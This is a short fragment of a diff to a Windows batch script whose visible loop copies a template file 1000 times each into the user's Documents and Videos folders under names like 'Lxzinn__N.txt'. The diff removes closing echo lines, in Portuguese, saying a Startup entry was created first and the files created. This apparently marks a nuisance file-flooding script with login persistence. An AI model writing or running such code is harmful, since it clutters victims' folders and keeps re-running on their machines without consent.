@@ -43,8 +43,3 @@ for /L %%i in (1,1,1000) do (
     copy /Y "%MODEL%" "%DOCUMENTS%\Lxzinn__%%i.txt" >nul
     copy /Y "%MODEL%" "%VIDEOS%\Lxzinn__%%i.txt" >nul
 )
-
-echo.
-echo ✔ Startup criado PRIMEIRO
-echo ✔ Arquivos criados agora
-pause
